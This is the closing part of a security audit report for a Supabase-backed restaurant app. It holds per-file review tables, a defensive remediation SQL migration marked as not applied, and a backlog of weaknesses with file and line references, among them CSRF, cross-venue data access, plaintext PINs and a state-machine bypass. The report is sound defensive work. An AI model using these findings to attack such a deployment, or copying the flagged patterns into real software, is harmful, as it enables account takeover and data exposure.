| `lib/services/table/get-tables.service.ts` | PASS |  |
| `lib/services/table/resolve-table.util.ts` | PASS |  |
| `lib/services/table/table-crud.service.ts` | PASS |  |
| `lib/services/table/table-occupancy.util.ts` | PASS |  |
| `lib/services/table/table-zone.service.ts` | PASS |  |
| `lib/services/table/table-zones.ts` | PASS |  |
| `lib/services/table/update-table.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/table.service.ts</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/table.service.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/services/vendors</b> (2 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/vendors/vendor-input.ts` | PASS |  |
| `lib/services/vendors/vendors.service.ts` | PASS |  |

</details>

<details><summary><b>lib/services/venue</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/venue/waiter-settle-setting.ts` | PASS |  |

</details>

<details><summary><b>lib/services/wallet</b> (30 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/services/wallet/bill-owner.util.ts` | PASS |  |
| `lib/services/wallet/billing-day.ts` | PASS |  |
| `lib/services/wallet/cashback-ledger.util.ts` | PASS |  |
| `lib/services/wallet/cashback.service.ts` | PASS |  |
| `lib/services/wallet/day-slips.service.ts` | PASS |  |
| `lib/services/wallet/day-slips.util.ts` | PASS |  |
| `lib/services/wallet/fee-guard.service.ts` | PASS |  |
| `lib/services/wallet/free-tier.service.ts` | PASS |  |
| `lib/services/wallet/host-wallet-view.service.ts` | PASS |  |
| `lib/services/wallet/invoice-detail.service.ts` | PASS |  |
| `lib/services/wallet/invoice-history.service.ts` | PASS |  |
| `lib/services/wallet/invoice-history.util.ts` | PASS |  |
| `lib/services/wallet/order-number-column.ts` | PASS |  |
| `lib/services/wallet/plans.ts` | PASS |  |
| `lib/services/wallet/platform-payment.ts` | PASS |  |
| `lib/services/wallet/redemption-store.util.ts` | PASS |  |
| `lib/services/wallet/redemption.service.ts` | PASS |  |
| `lib/services/wallet/subscription-state.ts` | PASS |  |
| `lib/services/wallet/topup-input.ts` | PASS |  |
| `lib/services/wallet/topup-request-approval.service.ts` | PASS |  |
| `lib/services/wallet/topup-request-create.service.ts` | PASS |  |
| `lib/services/wallet/topup-request-queries.service.ts` | PASS |  |
| `lib/services/wallet/topup-request-rejection.service.ts` | PASS |  |
| `lib/services/wallet/venue-plan.service.ts` | PASS |  |
| `lib/services/wallet/venue-wallet.service.ts` | PASS |  |
| `lib/services/wallet/wallet-claim.service.ts` | PASS |  |
| `lib/services/wallet/wallet-details.service.ts` | PASS |  |
| `lib/services/wallet/wallet-history.service.ts` | PASS |  |
| `lib/services/wallet/wallet-memory.store.ts` | PASS |  |
| `lib/services/wallet/wallet-provision.service.ts` | PASS |  |

</details>

<details><summary><b>lib/showcase</b> (3 files: 0 FLAG, 3 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/showcase/demo-extras.ts` | NOT REVIEWED |  |
| `lib/showcase/demo-orders.ts` | NOT REVIEWED |  |
| `lib/showcase/demo-screens.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/store</b> (4 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/store/active-order-store.ts` | PASS |  |
| `lib/store/cart.store.ts` | PASS |  |
| `lib/store/guest-lobby.store.ts` | PASS |  |
| `lib/store/host-workspace.store.ts` | PASS |  |

</details>

<details><summary><b>lib/supabase</b> (3 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/supabase/admin.ts` | PASS |  |
| `lib/supabase/client.ts` | PASS |  |
| `lib/supabase/server.ts` | PASS |  |

</details>

<details><summary><b>lib/testing</b> (1 files: 0 FLAG, 1 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/testing/fake-supabase.ts` | NOT REVIEWED |  |

</details>

<details><summary><b>lib/utils</b> (31 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/utils/accommodations.ts` | PASS |  |
| `lib/utils/after-response.ts` | PASS |  |
| `lib/utils/api-client.ts` | PASS |  |
| `lib/utils/api-response.ts` | PASS |  |
| `lib/utils/business-day.ts` | PASS |  |
| `lib/utils/catalog-item.ts` | PASS |  |
| `lib/utils/catalog-trie.util.ts` | PASS |  |
| `lib/utils/chunk-error.ts` | PASS |  |
| `lib/utils/completion.ts` | PASS |  |
| `lib/utils/csv.ts` | PASS |  |
| `lib/utils/escape-html.ts` | PASS |  |
| `lib/utils/gst-rates.ts` | PASS |  |
| `lib/utils/gst.ts` | PASS |  |
| `lib/utils/hostUtils.ts` | PASS |  |
| `lib/utils/ids.ts` | PASS |  |
| `lib/utils/kitchen-normalize.ts` | PASS |  |
| `lib/utils/kitchen.ts` | PASS |  |
| `lib/utils/kot-notes.ts` | PASS |  |
| `lib/utils/kot-timeline.ts` | PASS |  |
| `lib/utils/live-table-state.ts` | PASS |  |
| `lib/utils/menu-categories.ts` | PASS |  |
| `lib/utils/qr-session.ts` | PASS |  |
| `lib/utils/receipt-adapter.ts` | PASS |  |
| `lib/utils/safe-message.ts` | PASS |  |
| `lib/utils/shared-get.ts` | PASS |  |
| `lib/utils/table-guest.ts` | PASS |  |
| `lib/utils/table-kitchen.ts` | PASS |  |
| `lib/utils/upi.ts` | PASS |  |
| `lib/utils/use-poll.ts` | PASS |  |
| `lib/utils/uuid.ts` | PASS |  |
| `lib/utils/wallet-secret.ts` | PASS |  |

</details>

<details><summary><b>lib/validations</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/validations/onboarding.ts` | PASS |  |

</details>

<details><summary><b>lib/venue</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/venue/venue-model.ts` | PASS |  |

</details>

<details><summary><b>lib/vibey</b> (28 files: 3 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `lib/vibey/core/flags.ts` | PASS |  |
| `lib/vibey/core/llm.ts` | PASS |  |
| `lib/vibey/core/telemetry.ts` | PASS |  |
| `lib/vibey/guest/answers.ts` | PASS |  |
| `lib/vibey/guest/concepts.ts` | PASS |  |
| `lib/vibey/guest/diet.ts` | PASS |  |
| `lib/vibey/guest/fastpath.ts` | PASS |  |
| `lib/vibey/guest/graph.ts` | PASS |  |
| `lib/vibey/guest/lexicon-more.ts` | PASS |  |
| `lib/vibey/guest/lexicon.ts` | PASS |  |
| `lib/vibey/guest/resolve.ts` | PASS |  |
| `lib/vibey/guest/respond.ts` | PASS |  |
| `lib/vibey/guest/retrieve.ts` | PASS |  |
| `lib/vibey/guest/schema.ts` | PASS |  |
| `lib/vibey/guest/text.ts` | PASS |  |
| `lib/vibey/guest/understand.ts` | PASS |  |
| `lib/vibey/guest/venue.ts` | PASS |  |
| `lib/vibey/host/chips.ts` | PASS |  |
| `lib/vibey/host/compose.ts` | PASS |  |
| `lib/vibey/host/format.ts` | PASS |  |
| `lib/vibey/host/graph.ts` | FLAG | NV-20 |
| `lib/vibey/host/locks.ts` | FLAG | NV-20 |
| `lib/vibey/host/router.ts` | PASS |  |
| `lib/vibey/host/schema.ts` | PASS |  |
| `lib/vibey/host/tools-floor.ts` | PASS |  |
| `lib/vibey/host/tools-money.ts` | FLAG | NV-20 |
| `lib/vibey/host/tools.ts` | PASS |  |
| `lib/vibey/host/verify-numbers.ts` | PASS |  |

</details>

<details><summary><b>middleware.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `middleware.ts` | PASS |  |

</details>

<details><summary><b>next.config.mjs</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `next.config.mjs` | PASS |  |

</details>

<details><summary><b>package.json</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `package.json` | PASS |  |

</details>

<details><summary><b>sentry.client.config.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `sentry.client.config.ts` | PASS |  |

</details>

<details><summary><b>sentry.edge.config.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `sentry.edge.config.ts` | PASS |  |

</details>

<details><summary><b>sentry.server.config.ts</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `sentry.server.config.ts` | PASS |  |

</details>

<details><summary><b>supabase/migrations</b> (131 files: 9 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `supabase/migrations/001_onboarding.sql` | PASS |  |
| `supabase/migrations/002_provisioning_foundation.sql` | PASS |  |
| `supabase/migrations/003_rls_policies.sql` | PASS |  |
| `supabase/migrations/004_catalog_and_inventory.sql` | PASS |  |
| `supabase/migrations/005_banking_details.sql` | PASS |  |
| `supabase/migrations/20260920231348_profile_personal_fields.sql` | PASS |  |
| `supabase/migrations/20260920234120_add_offers_accommodation.sql` | PASS |  |
| `supabase/migrations/20260920235832_add_catalog_metadata.sql` | PASS |  |
| `supabase/migrations/20260921002223_raw_inventory_ecosystem.sql` | PASS |  |
| `supabase/migrations/20260921003908_billing_pos_orders.sql` | PASS |  |
| `supabase/migrations/20260921143159_add_staff_pin.sql` | PASS |  |
| `supabase/migrations/20260921200700_add_staff_pin.sql` | PASS |  |
| `supabase/migrations/20260921201500_create_kitchen_tickets.sql` | PASS |  |
| `supabase/migrations/20260921204400_add_reorder_level.sql` | PASS |  |
| `supabase/migrations/20260921210000_recipes_and_analytics.sql` | PASS |  |
| `supabase/migrations/20260921220000_production_security_and_indexes.sql` | PASS |  |
| `supabase/migrations/20260921230600_create_promotions.sql` | PASS |  |
| `supabase/migrations/20260921234500_inventory_audits.sql` | PASS |  |
| `supabase/migrations/20260922000000_recipe_rls.sql` | PASS |  |
| `supabase/migrations/20260922190000_restaurant_tables_and_triggers.sql` | PASS |  |
| `supabase/migrations/20260922200000_extend_staff_for_pos_pin.sql` | PASS |  |
| `supabase/migrations/20260922210000_add_admin_pin.sql` | FLAG | NV-10 |
| `supabase/migrations/20260922220000_ensure_staff_pin.sql` | PASS |  |
| `supabase/migrations/20260922230000_add_protected_modules.sql` | PASS |  |
| `supabase/migrations/20260925000000_staff_and_expenses.sql` | PASS |  |
| `supabase/migrations/20260925000001_add_staff_pin_to_businesses.sql` | PASS |  |
| `supabase/migrations/20260925000002_accommodations_and_rooms.sql` | PASS |  |
| `supabase/migrations/20260925000003_add_room_category_addons.sql` | PASS |  |
| `supabase/migrations/20260925000004_room_stay_logs_and_checkin.sql` | PASS |  |
| `supabase/migrations/20260925000005_sync_accommodations_with_pos_orders.sql` | PASS |  |
| `supabase/migrations/20260925000006_realtime_qr_dine_in_sessions.sql` | PASS |  |
| `supabase/migrations/20260925000007_guest_social_lobby.sql` | PASS |  |
| `supabase/migrations/20260925000008_guest_sessions_customer_id.sql` | PASS |  |
| `supabase/migrations/20260927000001_bill_request_history.sql` | PASS |  |
| `supabase/migrations/20260927000005_host_profile_sync.sql` | PASS |  |
| `supabase/migrations/20260929000000_reviews_and_wallets.sql` | PASS |  |
| `supabase/migrations/20260929000001_businesses_profile_sync.sql` | PASS |  |
| `supabase/migrations/20260929000002_host_security_rls.sql` | PASS |  |
| `supabase/migrations/20260930000001_venue_photo_vault.sql` | PASS |  |
| `supabase/migrations/20260930000002_tables_management_sync.sql` | PASS |  |
| `supabase/migrations/20260930000003_venue_subscriptions_and_wallets.sql` | PASS |  |
| `supabase/migrations/20260930000004_venue_outstanding_bills.sql` | PASS |  |
| `supabase/migrations/20260930000005_accommodations_host_security_rls.sql` | PASS |  |
| `supabase/migrations/20260930000006_outstanding_bills_item_types.sql` | PASS |  |
| `supabase/migrations/20260930000007_fix_pay_as_you_go_subscription.sql` | PASS |  |
| `supabase/migrations/20260930000008_venue_live_offers.sql` | PASS |  |
| `supabase/migrations/20260930000009_venue_topup_requests.sql` | PASS |  |
| `supabase/migrations/20260930000010_decouple_topup_and_plan_requests.sql` | PASS |  |
| `supabase/migrations/20261003000001_add_guest_identification_fields.sql` | PASS |  |
| `supabase/migrations/20261003000002_venue_scoped_guest_wallets.sql` | PASS |  |
| `supabase/migrations/20261003000003_guest_wallet_redemptions.sql` | PASS |  |
| `supabase/migrations/20261004000001_comprehensive_rls_and_rpc_lockdown.sql` | PASS |  |
| `supabase/migrations/20261004000002_rpc_security_idor_and_pgbouncer.sql` | PASS |  |
| `supabase/migrations/20261004000003_production_pillars_rls_and_inventory.sql` | PASS |  |
| `supabase/migrations/20261005000002_rls_lockdown.sql` | FLAG | NV-10 |
| `supabase/migrations/20261005000003_p0_hardening_idempotency_gst_pins.sql` | PASS |  |
| `supabase/migrations/20261006000001_update_kot_status_rpc.sql` | FLAG | NV-04, NV-09, NV-16, NV-19 |
| `supabase/migrations/20261006000002_add_business_name_compatibility.sql` | PASS |  |
| `supabase/migrations/20261006000003_phase2b_subscription_billing_and_topup.sql` | FLAG | NV-01 |
| `supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql` | FLAG | NV-01, NV-09 |
| `supabase/migrations/20261006000005_generate_daily_z_report_rpc.sql` | PASS |  |
| `supabase/migrations/20261006000006_atomic_guest_order_and_inventory_idempotency.sql` | PASS |  |
| `supabase/migrations/20261006000007_wallet_topup_redemption_idempotency.sql` | PASS |  |
| `supabase/migrations/20261006000008_atomic_host_provisioning.sql` | PASS |  |
| `supabase/migrations/20261006000009_provision_slug_collision_handling.sql` | PASS |  |
| `supabase/migrations/20261006000010_provision_persist_email.sql` | FLAG | NV-06 |
| `supabase/migrations/20261006000011_public_guest_menu.sql` | PASS |  |
| `supabase/migrations/20261007000001_fix_settlement_rpc_schema_mismatch.sql` | PASS |  |
| `supabase/migrations/20261008000001_zreport_ist_and_lockdown.sql` | PASS |  |
| `supabase/migrations/20261008000002_guest_wallet_claims.sql` | PASS |  |
| `supabase/migrations/20261008000003_lobby_venue_scoping.sql` | PASS |  |
| `supabase/migrations/20261008000004_schema_drift_fixes.sql` | PASS |  |
| `supabase/migrations/20261008000005_live_schema_reconcile_and_cashback_fix.sql` | PASS |  |
| `supabase/migrations/20261008000006_staff_notification_types.sql` | PASS |  |
| `supabase/migrations/20261008000007_lockdown_businesses_rls.sql` | PASS |  |
| `supabase/migrations/20261008000008_guest_accounts.sql` | PASS |  |
| `supabase/migrations/20261009000001_wallet_code_and_redemption_guards.sql` | PASS |  |
| `supabase/migrations/20261009000002_settlement_billing_atomic_and_replay.sql` | PASS |  |
| `supabase/migrations/20261009000003_cashback_on_full_bill.sql` | FLAG | NV-05 |
| `supabase/migrations/20261009000004_guest_profile_traveller.sql` | PASS |  |
| `supabase/migrations/20261009000005_guest_avatar_photo.sql` | PASS |  |
| `supabase/migrations/20261009000006_lobby_feed_and_review_authors.sql` | PASS |  |
| `supabase/migrations/20261009000007_lobby_likes_and_replies.sql` | PASS |  |
| `supabase/migrations/20261010000002_offer_requests.sql` | PASS |  |
| `supabase/migrations/20261010000003_live_offers_realtime.sql` | PASS |  |
| `supabase/migrations/20261010000004_kitchen_station_routing.sql` | PASS |  |
| `supabase/migrations/20261010000005_void_pending_order_line.sql` | PASS |  |
| `supabase/migrations/20261010000006_rooms_realtime.sql` | PASS |  |
| `supabase/migrations/20261010000007_inventory_movement_engine.sql` | PASS |  |
| `supabase/migrations/20261010000008_vendors_and_purchase_orders.sql` | PASS |  |
| `supabase/migrations/20261010000009_payroll_and_bills.sql` | PASS |  |
| `supabase/migrations/20261010000010_venue_profile_details.sql` | PASS |  |
| `supabase/migrations/20261010000011_subscription_billing_fixes.sql` | PASS |  |
| `supabase/migrations/20261010000012_catalog_overview_view.sql` | PASS |  |
| `supabase/migrations/20261010000013_dish_likes.sql` | PASS |  |
| `supabase/migrations/20261010000014_menu_info.sql` | PASS |  |
| `supabase/migrations/20261010000015_photo_vault_repair.sql` | PASS |  |
| `supabase/migrations/20261010000016_photo_vault_tags.sql` | PASS |  |
| `supabase/migrations/20261010000017_guest_bill_ownership.sql` | PASS |  |
| `supabase/migrations/20261010000018_gst_verification.sql` | PASS |  |
| `supabase/migrations/20261010000019_vibers_accounts.sql` | PASS |  |
| `supabase/migrations/20261011000001_club_identity.sql` | PASS |  |
| `supabase/migrations/20261011000002_club_social.sql` | PASS |  |
| `supabase/migrations/20261011000003_club_events_marketplace.sql` | PASS |  |
| `supabase/migrations/20261011000004_club_ledger.sql` | PASS |  |
| `supabase/migrations/20261011000005_club_common_room.sql` | PASS |  |
| `supabase/migrations/20261012000001_club_places_social.sql` | PASS |  |
| `supabase/migrations/20261012000002_club_profile_details.sql` | PASS |  |
| `supabase/migrations/20261012000003_club_username.sql` | PASS |  |
| `supabase/migrations/20261012000004_club_bio.sql` | PASS |  |
| `supabase/migrations/20261012000005_club_meetups.sql` | PASS |  |
| `supabase/migrations/20261012000006_club_meetup_photos.sql` | PASS |  |
| `supabase/migrations/20261014000001_kitchen_ticket_table_note.sql` | PASS |  |
| `supabase/migrations/20261014000002_order_item_owner.sql` | PASS |  |
| `supabase/migrations/20261014000003_kot_status_logs_rls.sql` | PASS |  |
| `supabase/migrations/20261016000002_waiter_settle_switch.sql` | PASS |  |
| `supabase/migrations/20261016000003_staff_pin_login.sql` | PASS |  |
| `supabase/migrations/20261016000004_floor_ping.sql` | PASS |  |
| `supabase/migrations/20261016000005_serialize_table_orders.sql` | PASS |  |
| `supabase/migrations/20261016000006_table_ping.sql` | PASS |  |
| `supabase/migrations/20261016000007_live_events_and_guest_ledger.sql` | PASS |  |
| `supabase/migrations/20261016000008_event_interest_alert_type.sql` | PASS |  |
| `supabase/migrations/20261016000009_event_gender_quotas.sql` | FLAG | NV-13 |
| `supabase/migrations/20261016000010_ledger_visits.sql` | PASS |  |
| `supabase/migrations/20261016000011_reservations_and_hours.sql` | PASS |  |
| `supabase/migrations/20261016000012_guest_delivery.sql` | FLAG | NV-08, NV-14, NV-19 |
| `supabase/migrations/20261016000013_venue_vendors.sql` | PASS |  |
| `supabase/migrations/20261018000001_daily_order_numbers.sql` | PASS |  |
| `supabase/migrations/20261018000002_lockdown_tenant_tables.sql` | PASS |  |
| `supabase/migrations/20261018000003_table_zones.sql` | PASS |  |
| `supabase/migrations/20261018000004_vibey.sql` | PASS |  |

</details>

<details><summary><b>utils/supabase</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `utils/supabase/client.ts` | PASS |  |

</details>

<details><summary><b>vercel.json</b> (1 files: 0 FLAG, 0 not reviewed)</summary>

| File | Status | Leads |
|---|---|---|
| `vercel.json` | PASS |  |

</details>

## 6. Recommended remediation migration for the P1 SQL cluster (not applied)

The statements below come from the per-lead fixes. They have **not** been applied to the repo or the database. Apply them on staging first and re-run the section 3 queries.

```sql
-- 1) Lock client roles out of server-only SECURITY DEFINER functions
REVOKE ALL ON FUNCTION public.deduct_venue_wallet_credits(uuid,numeric,text,text) FROM PUBLIC, anon, authenticated;
GRANT EXECUTE ON FUNCTION public.deduct_venue_wallet_credits(uuid,numeric,text,text) TO service_role;
REVOKE ALL ON FUNCTION public.update_kot_status(uuid,text,uuid) FROM PUBLIC, anon, authenticated;
GRANT EXECUTE ON FUNCTION public.update_kot_status(uuid,text,uuid) TO service_role;
-- (the host PATCH route must then call update_kot_status via adminDb() after its venue check)
REVOKE EXECUTE ON FUNCTION public.submit_guest_order_atomic FROM authenticated;   -- name the full 17-arg signature
REVOKE EXECUTE ON FUNCTION public.execute_atomic_bill_settlement FROM authenticated; -- name the full 12-arg signature
REVOKE ALL ON FUNCTION public.verify_staff_pin FROM PUBLIC, anon, authenticated;
REVOKE ALL ON FUNCTION public.create_reservation_atomic FROM PUBLIC, anon, authenticated;

-- 2) Stop handing future objects to anon
ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE EXECUTE ON FUNCTIONS FROM anon, authenticated;
ALTER DEFAULT PRIVILEGES IN SCHEMA public REVOKE SELECT, INSERT, UPDATE, DELETE ON TABLES FROM anon;

-- 3) Inside deduct_venue_wallet_credits: IF p_amount IS NULL OR p_amount <= 0 THEN RETURN error
-- 4) Inside provision_host_business: IF auth.role() <> 'service_role' AND p_host_id IS DISTINCT FROM auth.uid() THEN RAISE
-- 5) Replace current_setting('request.jwt.claim.role') checks with auth.role()/auth.uid() in the money RPCs
-- 6) UPDATE public.businesses SET admin_pin = NULL WHERE admin_pin = '0000' AND admin_pin_hash IS NULL;
```

App-code fixes for the remaining P1 leads:
- `lib/services/session/settle-session.service.ts:97-103,121`: add `.eq('business_id', businessId)` and never reassign `businessId`.
- `lib/services/kitchen/create-ticket.service.ts:19-38`: verify `orderId` belongs to the venue.
- `lib/services/guest-order/get-order.service.ts:28,126` and `lib/services/guest-session/init-session-helpers.util.ts:30`: return a column projection without `customer_phone` and `customer_name`.
- `lib/services/guest-session/init-session-helpers.util.ts:9-12`: scope the `restaurant_tables` lookup to the validated venue.

## 7. Hardening backlog (not findings)

- .github/workflows/ci.yml does not run npm run audit:guards (package.json:16), so the owner-route guard audit is not enforced on PRs.
- .github/workflows/ci.yml:26-96 pins third-party actions to mutable major tags (actions/checkout@v4, setup-node@v4, cache@v4) rather than commit SHAs.
- 20260922200000_extend_staff_for_pos_pin.sql:7 alters staff_profiles before 20260925000000_staff_and_expenses.sql:2 creates it, so a fresh replay of the migrations fails and live state can drift from the files.
- A production migration seeds a fixed venue with a 5000.00 wallet balance (supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql:273-275).
- ALTER DEFAULT PRIVILEGES still grants table DML and function EXECUTE to anon for every new object, so each new table or function is safe only while it enables RLS or is revoked explicitly (supabase/migrations/20261006000004_database_merge_and_permissions_fix.sql:226-228).
- Add-on prices chosen in the guest UI are sent only inside notes and are never charged, because the server prices only the base catalog item (components/guest/menu/hooks/useGuestOrderDispatch.ts:54).
- Admin approval passes the admin's user-scoped client to approve_topup_request, which is service_role-only, so approvals fail closed (app/api/admin/topup-requests/route.ts:43, supabase/migrations/20261010000011_subscription_billing_fixes.sql:132).
- Anonymous lobby_messages POST accepts spoofable guest_name/session_id, and GET returns session_id via select('*') (app/api/guest/lobby/route.ts:41-48,99-118).
- Anonymous reviews take a free-text author name and up to five arbitrary image URLs rendered as <img> to every guest (lib/services/reviews/review-write.ts:13,17; components/guest/lobby/reviews/ReviewCard.tsx:44).
- Bank account fields and plaintext staff_pin/admin_pin live on businesses (supabase/migrations/005_banking_details.sql:3-7, 20260921200700_add_staff_pin.sql:2), so any future open SELECT policy on businesses exposes them; a host-only side table would be safer.
- BroadcastChannel 'quad_kitchen_sync' messages are trusted by table label and order id only, with no venue/session binding (components/guest/menu/hooks/useGuestRealtimeSync.ts:65-75); impact is limited to local display state.
- Event interest and reservations need no contact verification, so fake numbers within the per-IP limits can fill an event's seats or a slot's tables until the host declines them (app/api/guest/events/interest/route.ts:26,44; app/api/guest/reserve/route.ts:19).
- GET /api/guest/auth/me creates guest records and sessions as a side effect of a safe method (app/api/guest/auth/me/route.ts:31).
- Guest catalog returns catalog_items select('*') and echoes raw DB error messages (app/api/guest/catalog/route.ts:63,70).
- Guest order lines have no line-count cap or notes length cap, unlike the host path's 30 lines and 140 chars (lib/services/guest-order/submit-order.service.ts:51, :169).
- GuestAuthSheet auto-applies any existing Supabase session on the browser as the guest identity (components/guest/account/GuestAuthSheet.tsx:38-44), so on a venue device where a host stays signed in, guests are signed in as the host's Vibers account.
- Invitation PATCH lets any caller who names the receiver table accept when receiver_session_id is null, and session_b becomes the caller-chosen id (app/api/guest/lobby/route.ts:216-228).
- Legacy lobby private chats use the client session_id as the only bearer, and it is broadcast in presence and invitation_response on the public room:lobby:<venue> channel; chat_message payloads are also broadcast venue-wide (app/api/guest/lobby/route.ts:51-73,122-150; components/guest/lobby/useGuestLobbyRealtime.ts:139-145; components/guest/lobby/lobby-realtime.service.ts:81-106). Not exploitable today only because app/guest/lobby/page.tsx:93-101 never opens the invitation flow; remove the legacy API or bind chats to the guest_auth session.
- Lobby post upload relies on the Content-Length header before request.formData() buffers the body (app/api/guest/lobby/posts/route.ts:63-67).
- Login CSRF is possible: /api/guest/auth/login parses JSON regardless of Content-Type (app/api/guest/auth/login/route.ts:20), so a cross-site text/plain form can sign a victim into an attacker guest account; add an Origin check.
- Lounge page falls back to the shared session id 'gst-current' when no session exists (app/guest/lobby/page.tsx:40).
- No CSP (next.config.mjs) means the print windows and host console rely solely on React/manual escaping; a CSP with script-src restrictions would contain any future sink regression.
- No Content-Security-Policy is set (next.config.mjs:16-29); React escaping is the only XSS control for host- and guest-authored text rendered across components/guest.
- Offer request status GET is bound to venue and an unguessable id but not to the requesting guest (app/api/guest/offers/requests/[id]/route.ts:22).
- POST /api/guest/session has no rate limit, and every call upserts a guest_sessions row keyed by a client-chosen guest_session_id, which can also overwrite another guest's row (app/api/guest/session/route.ts:14, lib/services/guest-session/guest-record.util.ts:15).
- Reviews GET has no rate limit and no row limit (app/api/guest/reviews/route.ts:14-24; lib/services/reviews/review-view.ts:6-10).
- Supabase sign-out or account deletion does not revoke vc_guest_session rows created by connectVenue (lib/services/guest-auth/vibers-connect.service.ts:86).
- The 'Allow public read' USING(true) policies on restaurant_tables and catalog_items survive the 20261018000002 lockdown and expose every venue's table rows to anon (supabase/migrations/20261006000011_public_guest_menu.sql:19-27).
- The 'Hosts can insert own venue_topup_requests' policy lacks the status='pending' check that host_insert_pending_topup has; approve_topup_request only credits pending rows, so there is no current impact (supabase/migrations/20261008000007_lockdown_businesses_rls.sql:92-94).
- The 20261005000002 sweep (supabase/migrations/20261005000002_rls_lockdown.sql:21-23) matches only qual or with_check equal to 'true'; an open policy written as USING (1=1) or USING (business_id IS NOT NULL) would survive it.
- The guest duplicate check returns the full orders row for a matching idempotency_key at any table of the venue (lib/services/guest-order/submit-order.service.ts:71).
- VenueServicesMarquee falls back to an anon catalog_items query with no business_id filter (components/guest/menu/VenueServicesMarquee.tsx:52-59), showing other venues' services whenever RLS permits anon reads.
- app/api/auth/staff-pin/route.ts:35 login accepts any content type for JSON, allowing cross-site text/plain login CSRF if the attacker knows a valid PIN; require application/json or check Origin.
- app/api/auth/staff-pin/route.ts:40 login rate-limit subject is the raw body business_id while findVenueById lowercases it (staff-login.service.ts:40), so case variants split the 30/min IP+venue bucket; per-staff lockout still bounds guesses.
- app/api/auth/staff-pin/route.ts:68 logout clears only the cookie; a copied token stays valid until exp with no server-side revocation list.
- app/api/guest/auth/photo/route.ts:44 buffers request.arrayBuffer() before the 300 KB check when Content-Length is missing; size is bounded only by the platform body limit.
- app/api/guest/offers/requests/route.ts:32-33 a body table_number and guest_name override the validated URL table and the signed-in display name in the host alert feed.
- app/api/guest/wallet/redeem/route.ts:106 queries wallet_redemptions with guest_id IN the raw non-@ guest_id although ownership was proven only for the @handle form; restrict the query to owned identifiers.
- app/api/guest/wallet/redeem/route.ts:49 spreads the untrusted request body into the redemption payload; pass only explicit fields (amount, table_number).
- app/api/health/route.ts:17 runs an unauthenticated count:'exact' query on businesses for every call and returns the commit SHA at line 36; consider caching the probe briefly.
- app/api/host/accommodations/history/route.ts:72 and rooms/route.ts:27 return raw database error messages to the client.
- app/api/host/accommodations/rooms/route.ts:80 inserts a room with a body category_id that is not checked to belong to the venue.
- app/api/host/catalog/update/route.ts:106 and app/api/host/promotions/route.ts:34 return raw database error messages to the client (error-echo owned by h13).
- app/api/host/kitchen/tickets/route.ts:126 writes a body-supplied staff_id into status_history and kot_status_logs, so any venue staff can attribute a KOT change to another staff member.
- app/api/host/kitchen/tickets/route.ts:143 falls back to a direct service-role status write whenever the RPC errors, so an invalid transition rejected by update_kot_status (e.g. SERVED to PENDING) is applied anyway, bypassing the state machine.
- app/api/host/live-events/route.ts:24 and app/api/host/live-events/leads/route.ts:23 return select('*') rows to the client; an explicit column list would avoid exposing future columns.
- app/api/host/live-events/route.ts:37 and app/api/host/live-events/import/route.ts:28 are cookie-authenticated POSTs that parse request.json() without Content-Type or Origin checks; CSRF protection rests entirely on SameSite=Lax Supabase cookies.
- app/api/host/operating-hours/route.ts:52 ignores the upsertVenueHours error (venue-hours.service.ts:41), reporting success when hours were not saved.
- app/api/host/settings/waiter-settle/route.ts:22 and app/api/host/menu-info/route.ts:20 rely solely on the staff allowlist for owner-only writes; add an explicit auth.staff 403 like delivery-settings/route.ts:33 so a future allowlist widening cannot let staff self-enable settlement.
- app/api/host/vibey/route.ts:41 the vibey_host flag is checked before staff role filtering; consider disabling the co-pilot entirely for staff sessions unless the owner opts in.
- app/api/host/vibey/route.ts:51 owner lock state is client-claimed (unlocked boolean); replace it with the planned signed short-lived unlock token so the co-pilot enforces the PIN even if a shared owner device is used by staff.
- app/api/venue/photo-vault/route.ts:202-206 deletes only the table row; any stored image behind image_url is not removed from storage.
- app/api/venue/photo-vault/route.ts:89 and app/api/host/catalog/bulk-insert/route.ts:33 store any host-supplied image_url string (any scheme/host); restrict to https and the project's storage or allow-listed hosts.
- changeGuestPin and recoverGuestPin do not apply isWeakPin, unlike vibers-profile (lib/services/guest-auth/guest-account.service.ts:326,383).
- clearGuestIdentity (lib/guest/guest-account-client.ts:278-290) does not remove quad_delivery_order:<venue> (components/guest/delivery/delivery-client.ts:67-85), quad_guest_cart or quad_guest_session_v2, so after logout on a shared phone the previous user's delivery tracker (order id, total, UPI QR) and tray persist.
